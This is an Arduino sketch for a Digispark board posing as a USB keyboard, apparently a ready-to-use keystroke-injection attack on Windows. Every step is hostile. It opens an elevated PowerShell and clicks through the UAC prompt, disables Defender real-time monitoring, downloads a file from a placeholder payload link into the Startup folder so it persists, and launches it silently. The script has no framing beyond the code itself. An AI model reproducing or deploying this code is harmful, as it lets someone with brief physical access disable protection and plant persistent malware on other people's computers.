#include "DigiKeyboard.h"

void setup() {
  delay(1000);

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);  // Windows + R
    DigiKeyboard.delay(500);
DigiKeyboard.print("powershell -Command \"Start-Process powershell -Verb RunAs\""); 
  DigiKeyboard.delay(500);  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);  
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
  DigiKeyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true");
      DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -Command \"Invoke-WebRequest -Uri 'PAYLOAD_LINK' -OutFile '$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\program.exe'\"");
  DigiKeyboard.delay(500);
 DigiKeyboard.println("Start-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\program.exe\" -ArgumentList \"/silent\"");
    DigiKeyboard.delay(200);
  DigiKeyboard.println("exit");

  DigiKeyboard.sendKeyStroke(0);
 
}
  
void loop() {
}
